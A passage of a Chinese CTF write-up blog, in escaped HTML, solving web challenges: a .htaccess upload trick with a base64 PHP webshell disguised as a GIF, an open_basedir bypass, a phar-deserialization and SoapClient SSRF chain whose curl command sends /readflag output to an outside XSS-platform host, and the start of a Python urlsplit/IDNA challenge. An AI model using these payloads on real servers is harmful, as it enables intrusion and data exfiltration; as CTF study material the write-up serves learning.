class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>\n\n<p>.htaccess</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define height 12</span><br><span class=\"line\">#define width 12</span><br><span class=\"line\">AddType application&#x2F;x-httpd-php .cc</span><br><span class=\"line\">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.cc&quot;</span><br></pre></td></tr></table></figure>\n\n<p>1.cc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a00PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>\n\n<p>GIF89a与后面加密过的一句话不能使用空格或者回车隔开,因为base64解密文件时会出错，00可以修改为base64中允许出现的任意两个字符，此服务器版本为7.0+无法使用JS写法绕过&lt;?</p>\n<p><a href=\"https://www.cnblogs.com/cimuhuashuimu/p/11544487.html\" target=\"_blank\" rel=\"noopener\">绕过open_basedir参考文章</a></p>\n<p>绕过payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>先扫描目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;upload&#x2F;tmp_2c67ca1eaeadbdc1868d67003072b481&#x2F;1.cc</span><br></pre></td></tr></table></figure>\n\n<p>post内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>\n\n<p>返回内容</p>\n<p><img src=\"/pic/72.png\" alt=\"\"></p>\n<p>找到flag，读取flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/73.png\" alt=\"\"></p>\n<h2 id=\"Upload-Labs-2\"><a href=\"#Upload-Labs-2\" class=\"headerlink\" title=\"Upload Labs 2\"></a>Upload Labs 2</h2><p>给出了源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//admin.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'config.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Ad</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $cmd;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $clazz;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func1;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func2;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func3;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $instance;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $arg1;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $arg2;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $arg3;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;  <span class=\"comment\">//构造类时调用的方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;cmd = $cmd;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;clazz = $clazz;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;func1 = $func1;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;func2 = $func2;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;func3 = $func3;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;arg1 = $arg1;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;arg2 = $arg2;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;arg3 = $arg3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        $reflect = <span class=\"keyword\">new</span> ReflectionClass(<span class=\"keyword\">$this</span>-&gt;clazz);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();  <span class=\"comment\">//实例化clazz类</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $reflectionMethod = <span class=\"keyword\">new</span> ReflectionMethod(<span class=\"keyword\">$this</span>-&gt;clazz, <span class=\"keyword\">$this</span>-&gt;func1);</span><br><span class=\"line\">        $reflectionMethod-&gt;invoke(<span class=\"keyword\">$this</span>-&gt;instance, <span class=\"keyword\">$this</span>-&gt;arg1); <span class=\"comment\">//执行clazz中的func1方法，参数为arg1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $reflectionMethod = <span class=\"keyword\">new</span> ReflectionMethod(<span class=\"keyword\">$this</span>-&gt;clazz, <span class=\"keyword\">$this</span>-&gt;func2);</span><br><span class=\"line\">        $reflectionMethod-&gt;invoke(<span class=\"keyword\">$this</span>-&gt;instance, <span class=\"keyword\">$this</span>-&gt;arg2);<span class=\"comment\">//执行clazz中的func2方法，参数为arg2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        $reflectionMethod = <span class=\"keyword\">new</span> ReflectionMethod(<span class=\"keyword\">$this</span>-&gt;clazz, <span class=\"keyword\">$this</span>-&gt;func3);</span><br><span class=\"line\">        $reflectionMethod-&gt;invoke(<span class=\"keyword\">$this</span>-&gt;instance, <span class=\"keyword\">$this</span>-&gt;arg3);</span><br><span class=\"line\">    &#125; <span class=\"comment\">//执行clazz中的func3方法，参数为arg3</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;  <span class=\"comment\">//析构类调用的方法</span></span><br><span class=\"line\">        system(<span class=\"keyword\">$this</span>-&gt;cmd);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] == <span class=\"string\">'127.0.0.1'</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'admin'</span>]))&#123;</span><br><span class=\"line\">        $cmd = $_POST[<span class=\"string\">'cmd'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        $clazz = $_POST[<span class=\"string\">'clazz'</span>];</span><br><span class=\"line\">        $func1 = $_POST[<span class=\"string\">'func1'</span>];</span><br><span class=\"line\">        $func2 = $_POST[<span class=\"string\">'func2'</span>];</span><br><span class=\"line\">        $func3 = $_POST[<span class=\"string\">'func3'</span>];</span><br><span class=\"line\">        $arg1 = $_POST[<span class=\"string\">'arg1'</span>];</span><br><span class=\"line\">        $arg2 = $_POST[<span class=\"string\">'arg2'</span>];</span><br><span class=\"line\">        $arg2 = $_POST[<span class=\"string\">'arg3'</span>];</span><br><span class=\"line\">        $admin = <span class=\"keyword\">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class=\"line\">        $admin-&gt;check();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"You r not admin!\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.jianshu.com/p/d02cbde1cdd7\" target=\"_blank\" rel=\"noopener\">关于PHP反射类</a></p>\n<p>大致意思就是要构造ssrf进行命令执行。SoapClient可以构造http请求。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// func.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'class.php'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">\"submit\"</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">\"url\"</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i'</span>,$_POST[<span class=\"string\">'url'</span>]))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"Go away!\"</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $file_path = $_POST[<span class=\"string\">'url'</span>];</span><br><span class=\"line\">        $file = <span class=\"keyword\">new</span> File($file_path);</span><br><span class=\"line\">        $file-&gt;getMIME();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;Your file type is '$file' &lt;/p&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>传入的url要经过正则匹配，调用file类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// class.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'config.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file_name;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $type;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func = <span class=\"string\">\"Check\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file_name)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file_name = $file_name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $class = <span class=\"keyword\">new</span> ReflectionClass(<span class=\"keyword\">$this</span>-&gt;func);</span><br><span class=\"line\">        $a = $class-&gt;newInstanceArgs(<span class=\"keyword\">$this</span>-&gt;file_name);</span><br><span class=\"line\">        $a-&gt;check();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getMIME</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;type = finfo_file($finfo, <span class=\"keyword\">$this</span>-&gt;file_name);</span><br><span class=\"line\">        finfo_close($finfo);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;type;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Check</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file_name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file_name)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file_name = $file_name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $data = file_get_contents(<span class=\"keyword\">$this</span>-&gt;file_name);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mb_strpos($data, <span class=\"string\">\"&lt;?\"</span>) !== <span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"&amp;lt;? in contents!\"</span>);  <span class=\"comment\">//不能包含<span class=\"meta\">&lt;?</span></span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.w3school.com.cn/media/media_mimeref.asp\" target=\"_blank\" rel=\"noopener\">关于MME类型文件</a>   上传的文件要绕过Check::check()</p>\n<p>finfo_file会触发phar的反序列化<a href=\"https://paper.seebug.org/680/\" target=\"_blank\" rel=\"noopener\">参考文章1</a>     <a href=\"https://xz.aliyun.com/t/2958\" target=\"_blank\" rel=\"noopener\">参考文章2</a></p>\n<p>传入成功后url</p>\n<p>phar://开头被正则过滤，可以使用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php:&#x2F;&#x2F;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>生成phar文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file_name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $func = <span class=\"string\">\"SoapClient\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $target = <span class=\"string\">\"http://127.0.0.1/admin.php\"</span>;</span><br><span class=\"line\">        $post_string = <span class=\"string\">'admin=1&amp;cmd=curl --referer \"`/readflag`\" --insecure \"http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK\"&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">        $headers = [];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file_name  = [</span><br><span class=\"line\">            <span class=\"keyword\">null</span>,</span><br><span class=\"line\">            <span class=\"keyword\">array</span>(<span class=\"string\">'location'</span> =&gt; $target,</span><br><span class=\"line\">                <span class=\"string\">'user_agent'</span>=&gt; str_replace(<span class=\"string\">'^^'</span>, <span class=\"string\">\"\\r\\n\"</span>, <span class=\"string\">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class=\"string\">'^^'</span>,$headers).<span class=\"string\">'Content-Length: '</span>. (string)strlen($post_string).<span class=\"string\">'^^^^'</span>.$post_string),</span><br><span class=\"line\">                <span class=\"string\">'uri'</span>=&gt;<span class=\"string\">'hello'</span>)</span><br><span class=\"line\">        ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> File();</span><br><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">'poc.phar'</span>);</span><br><span class=\"line\">$phar-&gt;startBuffering();</span><br><span class=\"line\">$phar-&gt;setStub(<span class=\"string\">\"GIF89a __HALT_COMPILER();\"</span>);</span><br><span class=\"line\">$phar-&gt;setMetadata($obj);</span><br><span class=\"line\">$phar-&gt;addFromString(<span class=\"string\">'1.txt'</span>,<span class=\"string\">'text'</span>);</span><br><span class=\"line\">$phar-&gt;stopBuffering();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>将生成的poc.phar改一个图片文件后缀，然后上传</p>\n<p>再func.php里面提交url</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;upload&#x2F;2c67ca1eaeadbdc1868d67003072b481&#x2F;551ccbaef945b2c4f3ca88361f08d600.jpg</span><br></pre></td></tr></table></figure>\n\n<p>关于构造SoapClient当中的cmd命令为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --referer &quot;&#96;&#x2F;readflag&#96;&quot; --insecure &quot;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api%26id&#x3D;dzWPkK&quot;</span><br></pre></td></tr></table></figure>\n\n<p>因为没有回显，只能使用将flag外带的方式带出来，使用buuoj的xss平台。id后面的字符是你创建的工程的数值</p>\n<p>附上出题人<a href=\"https://xz.aliyun.com/t/6057\" target=\"_blank\" rel=\"noopener\">出题笔记</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"Pythonginx\"><a href=\"#Pythonginx\" class=\"headerlink\" title=\"Pythonginx\"></a>Pythonginx</h2><ul>\n<li><p>2019 usa black hat一个议题  <a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\" target=\"_blank\" rel=\"noopener\">会议pdf</a></p>\n<p><img src=\"/pic/67\" alt=\"\"></p>\n</li>\n<li><p>关于<a href=\"https://datatracker.ietf.org/doc/rfc5891/\" target=\"_blank\" rel=\"noopener\">idna编码</a>   在处理℆时，经过idna编码，再经过utf-8解码就会变成c/u</p>\n</li>\n<li><p>CVE-2019-9636  : urlsplit不处理NFKC标准化   </p>\n</li>\n</ul>","more":"<p>题目给了源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getUrl</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    url = request.args.get(<span class=\"string\">\"url\"</span>)</span><br><span class=\"line\">    host = parse.urlparse(url).hostname   <span class=\"comment\">#返回netloc部分</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 111\"</span></span><br><span class=\"line\">    parts = list(urlsplit(url))</span><br><span class=\"line\">    host = parts[<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 222 \"</span> + host</span><br><span class=\"line\">    newhost = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> host.split(<span class=\"string\">'.'</span>):</span><br><span class=\"line\">        newhost.append(h.encode(<span class=\"string\">'idna'</span>).decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    parts[<span class=\"number\">1</span>] = <span class=\"string\">'.'</span>.join(newhost)</span><br><span class=\"line\">    <span class=\"comment\">#去掉 url 中的空格</span></span><br><span class=\"line\">    finalUrl = urlunsplit(parts).split(<span class=\"string\">' '</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    host = parse.urlparse(finalUrl).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 333\"</span></span><br></pre></td></tr></table></figure>\n\n<p><em>parse.urlparse()函数：将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：<code>scheme://netloc/path;parameters?query#fragment</code></em></p>\n<p>大致意思就是第一二次判断时netloc不是 suctf.cc，第三次要是suctf.cc,就返回url的网页源码</p>\n<p>题目标题是pythonginx，提示nginx，nginx文件路径如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class=\"line\">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class=\"line\">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class=\"line\">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class=\"line\">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class=\"line\">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class=\"line\">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class=\"line\">网站配置文件：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>非预期解</strong></p>\n<p>以下是urlsplit函数源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span 